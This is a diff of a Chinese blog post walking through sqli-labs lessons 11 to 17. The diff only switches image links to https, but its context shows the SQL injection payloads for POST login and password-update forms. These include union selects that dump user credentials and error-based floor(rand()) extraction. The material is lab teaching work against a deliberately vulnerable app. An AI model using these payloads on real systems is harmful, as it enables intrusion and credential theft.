@@ -21,23 +21,23 @@
 <meta property="og:url" content="http://huirong.github.io/2016/08/26/sqli-labs-series-lesson11-17/index.html">
 <meta property="og:site_name" content="Star">
 <meta property="og:description" content="lesson 11~16的 SQL Injection 原理和lesson 1~10一样，只是lesson 11~16 是通过post传参，即在页面文本框中输入数据，而lesson 1~10是URL中传参。">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg">
-<meta property="og:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg">
-<meta property="og:image" content="http://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg">
-<meta property="og:image" content="http://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg">
-<meta property="og:image" content="http://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg">
-<meta property="og:updated_time" content="2016-09-07T08:14:18.520Z">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg">
+<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg">
+<meta property="og:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg">
+<meta property="og:image" content="https://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg">
+<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg">
+<meta property="og:image" content="https://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg">
+<meta property="og:image" content="https://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg">
+<meta property="og:updated_time" content="2017-02-19T10:36:44.117Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqli labs lesson 11~17 学习">
 <meta name="twitter:description" content="lesson 11~16的 SQL Injection 原理和lesson 1~10一样，只是lesson 11~16 是通过post传参，即在页面文本框中输入数据，而lesson 1~10是URL中传参。">
-<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg">
+<meta name="twitter:image" content="https://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg">
 
   
 
@@ -193,7 +193,7 @@
   <div class="article-content">
     
       <p>lesson 11~16的 SQL Injection 原理和lesson 1~10一样，只是lesson 11~16 是通过post传参，即在页面文本框中输入数据，而lesson 1~10是URL中传参。<br><a id="more"></a></p>
-<h1 id="1-lesson-11-POST-基于错误-单引号"><a href="#1-lesson-11-POST-基于错误-单引号" class="headerlink" title="1 lesson 11 POST-基于错误-单引号"></a>1 lesson 11 POST-基于错误-单引号</h1><p>在输入框输入 admin 和 password，页面显示 <code>LOGIN ATTEMPT FAILED</code><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg" alt=""></p>
+<h1 id="1-lesson-11-POST-基于错误-单引号"><a href="#1-lesson-11-POST-基于错误-单引号" class="headerlink" title="1 lesson 11 POST-基于错误-单引号"></a>1 lesson 11 POST-基于错误-单引号</h1><p>在输入框输入 admin 和 password，页面显示 <code>LOGIN ATTEMPT FAILED</code><br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f77hdibrafj30k00cimz4.jpg" alt=""></p>
 <h2 id="1-1-判断注入类型"><a href="#1-1-判断注入类型" class="headerlink" title="1.1 判断注入类型"></a>1.1 判断注入类型</h2><table>
 <thead>
 <tr>
@@ -216,14 +216,14 @@
 </tr>
 </tbody>
 </table>
-<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg" alt=""><br>“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’password’’ LIMIT 0,1’ at line 1”</p>
+<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hmjpaa7j311t07twfw.jpg" alt=""><br>“You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’password’’ LIMIT 0,1’ at line 1”</p>
 <p>说明是基于错误的、单引号注入</p>
 <p>sql 语句 ：<code>select * from tables where username=&#39;$username&#39; and password=&#39;$password&#39; limit 0,1</code></p>
 <h2 id="1-2-验证注入类型"><a href="#1-2-验证注入类型" class="headerlink" title="1.2 验证注入类型"></a>1.2 验证注入类型</h2><ul>
 <li>参数 $username=<code>admin&#39; and 1=1#</code>   $password 为空</li>
 <li>sql 语句  <code>select * from tables where username=&#39;admin&#39; and 1=1#&#39; and password=&#39;&#39; limit 0,1</code></li>
 </ul>
-<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg" alt=""></p>
+<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f77hwezjw1j30k00f2mzb.jpg" alt=""></p>
 <p>账号：admin   密码：admin<br>SUCCESSFULLY LOGGED IN</p>
 <h2 id="1-3-order-by-判断字段个数"><a href="#1-3-order-by-判断字段个数" class="headerlink" title="1.3 order by 判断字段个数"></a>1.3 order by 判断字段个数</h2><table>
 <thead>
@@ -252,11 +252,11 @@
 </tbody>
 </table>
 <p>从数据库中 <font color="red">选取了 2 个字段</font><br>sql 语句：<code>select col1,col2 from tables where username=&#39;$username&#39; and password=&#39;$password&#39; limit 0,1</code></p>
-<h2 id="1-4-利用-information-schema-获得信息"><a href="#1-4-利用-information-schema-获得信息" class="headerlink" title="1.4 利用 information_schema 获得信息"></a>1.4 利用 information_schema 获得信息</h2><h3 id="1-4-1-union-获得数据库和版本"><a href="#1-4-1-union-获得数据库和版本" class="headerlink" title="1.4.1 union 获得数据库和版本"></a>1.4.1 union 获得数据库和版本</h3><p>username：  <code>&#39; union select 1,2#</code><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg" alt=""><br>1,2 可以在页面上显示</p>
-<p>username ： <code>&#39; union select database(),version()#</code><br><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg" alt=""><br>数据库：security<br>版本：5.6.17</p>
-<h3 id="1-4-2-表名"><a href="#1-4-2-表名" class="headerlink" title="1.4.2 表名"></a>1.4.2 表名</h3><p>username： <code>&#39; union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database()#</code><br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg" alt=""><br>表：emails,referers,uagents,users</p>
-<h3 id="1-4-3-字段名"><a href="#1-4-3-字段名" class="headerlink" title="1.4.3 字段名"></a>1.4.3 字段名</h3><p>username： <code>&#39; union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema=database()#</code><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg" alt=""><br>字段名：id,email_id,referer,ip_address,uagent,username,password</p>
-<h3 id="1-4-4-账号和密码"><a href="#1-4-4-账号和密码" class="headerlink" title="1.4.4 账号和密码"></a>1.4.4 账号和密码</h3><p>username： <code>&#39; union select group_concat(username),group_concat(password) from users#</code><br><img src="http://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg" alt=""></p>
+<h2 id="1-4-利用-information-schema-获得信息"><a href="#1-4-利用-information-schema-获得信息" class="headerlink" title="1.4 利用 information_schema 获得信息"></a>1.4 利用 information_schema 获得信息</h2><h3 id="1-4-1-union-获得数据库和版本"><a href="#1-4-1-union-获得数据库和版本" class="headerlink" title="1.4.1 union 获得数据库和版本"></a>1.4.1 union 获得数据库和版本</h3><p>username：  <code>&#39; union select 1,2#</code><br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b3e50bhj30fa09qjrz.jpg" alt=""><br>1,2 可以在页面上显示</p>
+<p>username ： <code>&#39; union select database(),version()#</code><br><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f79b42mszyj30fa09st9f.jpg" alt=""><br>数据库：security<br>版本：5.6.17</p>
+<h3 id="1-4-2-表名"><a href="#1-4-2-表名" class="headerlink" title="1.4.2 表名"></a>1.4.2 表名</h3><p>username： <code>&#39; union select 1,group_concat(distinct table_name) from information_schema.tables where table_schema=database()#</code><br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f79b4vbkc2j30fa09qjs4.jpg" alt=""><br>表：emails,referers,uagents,users</p>
+<h3 id="1-4-3-字段名"><a href="#1-4-3-字段名" class="headerlink" title="1.4.3 字段名"></a>1.4.3 字段名</h3><p>username： <code>&#39; union select 1,group_concat(distinct column_name) from information_schema.columns where table_schema=database()#</code><br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79b7ei1aej30h80a0ab0.jpg" alt=""><br>字段名：id,email_id,referer,ip_address,uagent,username,password</p>
+<h3 id="1-4-4-账号和密码"><a href="#1-4-4-账号和密码" class="headerlink" title="1.4.4 账号和密码"></a>1.4.4 账号和密码</h3><p>username： <code>&#39; union select group_concat(username),group_concat(password) from users#</code><br><img src="https://ww1.sinaimg.cn/large/005CA6ZCgw1f79bb7r92nj30p70acq4e.jpg" alt=""></p>
 <table>
 <thead>
 <tr>
@@ -333,7 +333,7 @@
 </tr>
 </tbody>
 </table>
-<p><img src="http://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg" alt=""></p>
+<p><img src="https://ww2.sinaimg.cn/large/005CA6ZCgw1f79bqwm64dj30k00emtax.jpg" alt=""></p>
 <font color="red"> 说明是双引号闭合，且有括号</font>
 
 <p>其他获取数据库信息的步骤同 lesson 11</p>
@@ -358,14 +358,14 @@
 </table>
 <p> 说明是单引号闭合，且有括号</p>
 <h2 id="3-2-构造编译正确，运行可能出错的sql"><a href="#3-2-构造编译正确，运行可能出错的sql" class="headerlink" title="3.2 构造编译正确，运行可能出错的sql"></a>3.2 构造编译正确，运行可能出错的sql</h2><p>sql： <code>select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a</code><br>username：’) union select count(<em>),concat(database(),0x40,floor(rand()</em>2))a from information_schema.tables where table_schema=database() group by a#</p>
-<p>相同的输入，多次提交<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg" alt=""></p>
+<p>相同的输入，多次提交<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f79de281uuj30fa082dgc.jpg" alt=""></p>
 <p>错误：Duplicate entry ‘security@1’ for key ‘group_key’<br>说明数据库名字：security<br>同样的方法获取其他数据库信息</p>
 <h1 id="4-lesson-14-POST-基于错误-二次注入-单双引号"><a href="#4-lesson-14-POST-基于错误-二次注入-单双引号" class="headerlink" title="4 lesson 14 POST-基于错误-二次注入-单双引号"></a>4 lesson 14 POST-基于错误-二次注入-单双引号</h1><p>username：<code>&quot; union select count(*),concat(database(),0x40,floor(rand()*2))a from information_schema.tables where table_schema=database() group by a#</code></p>
 <p>除了闭合方式是双引号，其他注入过程同 lesson 13</p>
 <h1 id="5-lesson-15-POST-盲注-基于bool型"><a href="#5-lesson-15-POST-盲注-基于bool型" class="headerlink" title="5 lesson 15 POST 盲注-基于bool型"></a>5 lesson 15 POST 盲注-基于bool型</h1><p>思路同 <a href="sqli labs lesson 8~10 学习">sqli labs lesson 8~10 学习</a> lesson 8 盲注-基于bool值</p>
 <h1 id="6-lesson-16-POST-盲注-基于时间"><a href="#6-lesson-16-POST-盲注-基于时间" class="headerlink" title="6 lesson 16 POST 盲注-基于时间"></a>6 lesson 16 POST 盲注-基于时间</h1><p>思路同 <a href="sqli labs lesson 8~10 学习">sqli labs lesson 8~10 学习</a> lesson 9 盲注-基于时间-单引号</p>
 <h1 id="7-lesson-17-POST-UPDATE-基于错误"><a href="#7-lesson-17-POST-UPDATE-基于错误" class="headerlink" title="7 lesson 17 POST-UPDATE-基于错误"></a>7 lesson 17 POST-UPDATE-基于错误</h1><p>在文本框输入用户名和密码，显示“ SUCCESSFULLY UPDATED YOUR PASSWORD”，更新密码成功！！！</p>
-<p><img src="http://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg" alt=""></p>
+<p><img src="https://ww3.sinaimg.cn/large/005CA6ZCjw1f7d1oyjo66j30jq0eqdix.jpg" alt=""></p>
 <h2 id="1-1-判断注入类型-1"><a href="#1-1-判断注入类型-1" class="headerlink" title="1.1 判断注入类型"></a>1.1 判断注入类型</h2><table>
 <thead>
 <tr>
@@ -418,7 +418,7 @@
 <li>username：<code>admin</code></li>
 <li>new password：<code>&#39; or (select 1 from (select count(*),(concat(&quot;~&quot;,database(),&quot;~&quot;,floor(rand()*2)))c from information_schema.tables group by c)a)#</code></li>
 </ul>
-<p>多次运行之后，可能出现如下错误：<br><img src="http://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg" alt=""></p>
+<p>多次运行之后，可能出现如下错误：<br><img src="https://ww4.sinaimg.cn/large/005CA6ZCgw1f7ecqle3ivj30k00fgn0l.jpg" alt=""></p>
 <p>数据库名字会显示在页面上，以相同的方法获取数据库其他信息，具体过程，参见参见<a href="http://huirong.github.io/2016/08/25/sqli-labs-series-lesson5-7/">sqli labs lesson 5~7 学习</a>lesson 5。</p>
 
     
